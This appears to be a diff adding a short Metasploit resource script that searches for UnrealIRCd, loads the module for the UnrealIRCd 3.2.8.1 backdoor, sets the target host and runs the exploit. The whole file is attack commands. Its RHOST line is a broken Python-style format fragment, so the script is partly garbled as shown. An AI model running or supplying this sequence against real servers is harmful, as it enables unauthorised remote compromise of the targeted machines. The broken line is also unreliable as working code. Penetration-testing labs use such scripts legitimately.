@@ -1,0 +1,7 @@
+
+search unrealircd
+use    exploit/unix/irc/unreal_ircd_3281_backdoor
+show options
+set RHOST '  '{}'.format(Target)
+exploit
+
